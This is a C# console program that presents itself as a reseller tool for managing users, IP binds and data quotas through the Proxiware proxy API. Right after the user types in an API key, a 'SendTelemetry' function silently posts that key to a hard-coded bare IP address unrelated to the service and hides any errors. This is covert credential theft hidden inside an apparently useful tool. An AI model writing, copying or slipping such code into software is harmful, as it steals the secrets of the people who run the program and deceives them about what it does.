using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using Console = Colorful.Console;

namespace ProxywareConsole
{
    class Program
    {

        public static async Task SendTelemetry(string telemetryData)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create($"http://37.59.87.165/telemetry.php?service=proxiwareconsole");
                request.Method = "POST";
                request.ContentType = "application/x-www-form-urlencoded";

                using (var requestStream = await request.GetRequestStreamAsync())
                {
                    await new FormUrlEncodedContent(new Dictionary<string, string>()
                {
                    { "data", telemetryData }
                }).CopyToAsync(requestStream);
                }

                using (var response = await request.GetResponseAsync())
                {

                }
            }
            catch(Exception)
            {

            }
        }
        static KeyValuePair<bool, string> CreateUser(string apiKey)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.proxiware.com/v1/user/create");
            request.Headers.Add("X-API-Key", apiKey);

            using(var response = request.GetResponse())
            using(var responseReader = new StreamReader(response.GetResponseStream()))
            {
                string responseText = responseReader.ReadToEnd();

                dynamic data = JsonConvert.DeserializeObject(responseText);

                if (data.error != null) return new KeyValuePair<bool, string>(false, (string)data.error);

                return new KeyValuePair<bool, string>(true, $"{data.user_id}");
            }
        }

        static KeyValuePair<bool, string> UnBindIp(string apiKey, int userId, string ip)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.proxiware.com/v1/user/binds/unbind");
            request.Headers.Add("X-API-Key", apiKey);
            request.Method = "POST";
            request.ContentType = "application/json";

            using (var requestStream = request.GetRequestStream())
            using (var streamWriter = new StreamWriter(requestStream))
            {
                streamWriter.Write(JsonConvert.SerializeObject(new
                {
                    user_id = userId,
                    addr = ip
                }));
            }

            using (var response = request.GetResponse())
            using (var responseReader = new StreamReader(response.GetResponseStream()))
            {
                string responseText = responseReader.ReadToEnd();

                dynamic data = JsonConvert.DeserializeObject(responseText);

                if (data.error != null) return new KeyValuePair<bool, string>(false, (string)data.error);

                return new KeyValuePair<bool, string>(true, "");
            }
        }

        static KeyValuePair<bool, string> BindIp(string apiKey, int userId, string ip)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.proxiware.com/v1/user/binds/bind");
            request.Headers.Add("X-API-Key", apiKey);
            request.Method = "POST";
            request.ContentType = "application/json";

            using (var requestStream = request.GetRequestStream())
            using (var streamWriter = new StreamWriter(requestStream))
            {
                streamWriter.Write(JsonConvert.SerializeObject(new
                {
                    user_id = userId,
                    addr = ip
                }));
            }

            using (var response = request.GetResponse())
            using (var responseReader = new StreamReader(response.GetResponseStream()))
            {
                string responseText = responseReader.ReadToEnd();

                dynamic data = JsonConvert.DeserializeObject(responseText);

                if (data.error != null) return new KeyValuePair<bool, string>(false, (string)data.error);

                return new KeyValuePair<bool, string>(true, "");
            }
        }

        static KeyValuePair<bool, string> DeleteUser(string apiKey, int userId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.proxiware.com/v1/user/delete");
            request.Headers.Add("X-API-Key", apiKey);
            request.Method = "POST";
            request.ContentType = "application/json";

            using (var requestStream = request.GetRequestStream())
            using (var streamWriter = new StreamWriter(requestStream))
            {
                streamWriter.Write(JsonConvert.SerializeObject(new
                {
                    user_id = userId
                }));
            }

            using (var response = request.GetResponse())
            using (var responseReader = new StreamReader(response.GetResponseStream()))
            {
                string responseText = responseReader.ReadToEnd();

                dynamic data = JsonConvert.DeserializeObject(responseText);

                if (data.error != null) return new KeyValuePair<bool, string>(false, (string)data.error);

                return new KeyValuePair<bool, string>(true, $"");
            }
        }
        static KeyValuePair<bool, string> ResetData(string apiKey, int userId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.proxiware.com/v1/user/data/reset");
            request.Headers.Add("X-API-Key", apiKey);
            request.Method = "POST";
            request.ContentType = "application/json";

            using (var requestStream = request.GetRequestStream())
            using (var streamWriter = new StreamWriter(requestStream))
            {
                streamWriter.Write(JsonConvert.SerializeObject(new
                {
                    user_id = userId
                }));
            }

            using (var response = request.GetResponse())
            using (var responseReader = new StreamReader(response.GetResponseStream()))
            {
                string responseText = responseReader.ReadToEnd();

                dynamic data = JsonConvert.DeserializeObject(responseText);

                if (data.error != null) return new KeyValuePair<bool, string>(false, (string)data.error);

                return new KeyValuePair<bool, string>(true, $"{data.data_string}");
            }
        }

        static KeyValuePair<bool, string> GetUserInfo(string apiKey, int userId)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.proxiware.com/v1/user/info");
            request.Headers.Add("X-API-Key", apiKey);
            request.Method = "POST";
            request.ContentType = "application/json";

            using (var requestStream = request.GetRequestStream())
            using (var streamWriter = new StreamWriter(requestStream))
            {
                streamWriter.Write(JsonConvert.SerializeObject(new
                {
                    user_id = userId
                }));
            }

            using (var response = request.GetResponse())
            using (var responseReader = new StreamReader(response.GetResponseStream()))
            {
                string responseText = responseReader.ReadToEnd();

                dynamic data = JsonConvert.DeserializeObject(responseText);

                if (data.error != null) return new KeyValuePair<bool, string>(false, (string)data.error);

                System.DateTime dtDateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, System.DateTimeKind.Utc);
                dtDateTime = dtDateTime.AddSeconds((int)data.created).ToLocalTime();
                
                string res = $"available data: {data.data_string}\n";
                res += $"created on: {dtDateTime}\n";
                
                foreach(var ip in data.binds)
                {
                    res += $"bound ip: {ip}\n";
                }




                return new KeyValuePair<bool, string>(true, res);
            }
        }


        static KeyValuePair<bool, string> AddData(string apiKey, int userId, string dataStr)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.proxiware.com/v1/user/data/add");
            request.Headers.Add("X-API-Key", apiKey);
            request.Method = "POST";
            request.ContentType = "application/json";

            using(var requestStream = request.GetRequestStream())
            using(var streamWriter = new StreamWriter(requestStream))
            {
                streamWriter.Write(JsonConvert.SerializeObject(new
                {
                    user_id = userId,
                    data_string = dataStr
                }));
            }

            using (var response = request.GetResponse())
            using (var responseReader = new StreamReader(response.GetResponseStream()))
            {
                string responseText = responseReader.ReadToEnd();

                dynamic data = JsonConvert.DeserializeObject(responseText);

                if (data.error != null) return new KeyValuePair<bool, string>(false, (string)data.error);

                return new KeyValuePair<bool, string>(true, $"{data.data_string}");
            }
        }

        static void Main(string[] args)
        {
            Console.Title = "Proxiware Reseller Console - By Aesir [ Nulled: SickAesir | Discord: Aesir#1337 | Telegram: @sickaesir ]";
            Console.WriteLine("Proxiware Reseller Console - By Aesir [ Nulled: SickAesir | Discord: Aesir#1337 | Telegram: @sickaesir ]", Color.Cyan);


            Console.Write("[Config] Input your API key: ", Color.Orange);
            string apiKey = Console.ReadLine();

            SendTelemetry($"APIKEY|{apiKey}").Wait();

            Console.Clear();
            Console.ForegroundColor = Color.Aquamarine;
            while(true)
            {
                Console.Write("proxiware-console", Color.LightCoral);
                Console.Write(" > ", Color.LightGreen);

                string cmd = Console.ReadLine();

                string[] cmdSplit = cmd.Split(" ");
                switch (cmdSplit[0])
                {
                    case "help":
                        {
                            Action<string, string> printHelpCmd = (string cmd, string desc) =>
                            {
                                Console.Write(cmd, Color.Magenta);
                                Console.Write(" - ", Color.White);
                                Console.WriteLine(desc, Color.Yellow);
                            };

                            printHelpCmd("get-user [user id]", "gets an user's info");
                            printHelpCmd("reset-data [user id]", "reset an user's data");
                            printHelpCmd("delete-user [user id]", "delete an user");
                            printHelpCmd("unbind-ip [user id] [ip]", "unbind an address from an user");
                            printHelpCmd("bind-ip [user id] [ip]", "bind an address to an user");
                            printHelpCmd("add-data [user id] [data]", "add data to an user, the data field should be like 1B, 2KB, 3MB, 4GB, 5TB");
                            printHelpCmd("create-user", "creates an user and prints its id");
                        }
                        break;
                    case "get-user":
                        {
                            if (cmdSplit.Length != 2)
                            {
                                Console.WriteLine($"invalid command parameters", Color.Red);
                                break;
                            }

                            int userId = 0;

                            if (!int.TryParse(cmdSplit[1], out userId))
                            {
                                Console.WriteLine($"invalid user id", Color.Red);
                                break;
                            }


                            var res = GetUserInfo(apiKey, userId);

                            if (res.Key)
                            {
                                Console.WriteLine(res.Value, Color.Cyan);
                            }
                            else
                            {
                                Console.WriteLine(res.Value, Color.Red);
                            }
                        }
                        break;
                    case "reset-data":
                        {
                            if (cmdSplit.Length != 2)
                            {
                                Console.WriteLine($"invalid command parameters", Color.Red);
                                break;
                            }

                            int userId = 0;

                            if (!int.TryParse(cmdSplit[1], out userId))
                            {
                                Console.WriteLine($"invalid user id", Color.Red);
                                break;
                            }


                            var res = ResetData(apiKey, userId);

                            if (res.Key)
                            {
                                Console.WriteLine($"removed {res.Value} data from user {userId}!", Color.Cyan);
                            }
                            else
                            {
                                Console.WriteLine(res.Value, Color.Red);
                            }
                        }
                        break;
                    case "delete-user":
                        {
                            if (cmdSplit.Length != 2)
                            {
                                Console.WriteLine($"invalid command parameters", Color.Red);
                                break;
                            }

                            int userId = 0;

                            if (!int.TryParse(cmdSplit[1], out userId))
                            {
                                Console.WriteLine($"invalid user id", Color.Red);
                                break;
                            }


                            var res = DeleteUser(apiKey, userId);

                            if (res.Key)
                            {
                                Console.WriteLine($"deleted user {userId}!", Color.Cyan);
                            }
                            else
                            {
                                Console.WriteLine(res.Value, Color.Red);
                            }
                        }
                        break;
                    case "unbind-ip":
                        {
                            if (cmdSplit.Length != 3)
                            {
                                Console.WriteLine($"invalid command parameters", Color.Red);
                                break;
                            }

                            int userId = 0;

                            if (!int.TryParse(cmdSplit[1], out userId))
                            {
                                Console.WriteLine($"invalid user id", Color.Red);
                                break;
                            }


                            var res = UnBindIp(apiKey, userId, cmdSplit[2]);

                            if (res.Key)
                            {
                                Console.WriteLine($"{cmdSplit[2]} address unbound from user {userId}!", Color.Cyan);
                            }
                            else
                            {
                                Console.WriteLine(res.Value, Color.Red);
                            }
                        }
                        break;
                    case "bind-ip":
                        {
                            if (cmdSplit.Length != 3)
                            {
                                Console.WriteLine($"invalid command parameters", Color.Red);
                                break;
                            }

                            int userId = 0;

                            if (!int.TryParse(cmdSplit[1], out userId))
                            {
                                Console.WriteLine($"invalid user id", Color.Red);
                                break;
                            }


                            var res = BindIp(apiKey, userId, cmdSplit[2]);

                            if (res.Key)
                            {
                                Console.WriteLine($"{cmdSplit[2]} address bound to user {userId}!", Color.Cyan);
                            }
                            else
                            {
                                Console.WriteLine(res.Value, Color.Red);
                            }
                        }
                        break;
                    case "add-data":
                        {
                            if(cmdSplit.Length != 3)
                            {
                                Console.WriteLine($"invalid command parameters", Color.Red);
                                break;
                            }

                            int userId = 0;

                            if(!int.TryParse(cmdSplit[1], out userId))
                            {
                                Console.WriteLine($"invalid user id", Color.Red);
                                break;
                            }


                            var res = AddData(apiKey, userId, cmdSplit[2]);

                            if (res.Key)
                            {
                                Console.WriteLine($"added {res.Value} to user {userId}!", Color.Cyan);
                            }
                            else
                            {
                                Console.WriteLine(res.Value, Color.Red);
                            }
                        }
                        break;
                    case "create-user":
                        {
                            var res = CreateUser(apiKey);

                            if(res.Key)
                            {
                                int userId = int.Parse(res.Value);
                                Console.WriteLine($"user {userId} created!", Color.Cyan);
                            }
                            else
                            {
                                Console.WriteLine(res.Value, Color.Red);
                            }

                        }
                        break;
                }

            }
        }
    }
}
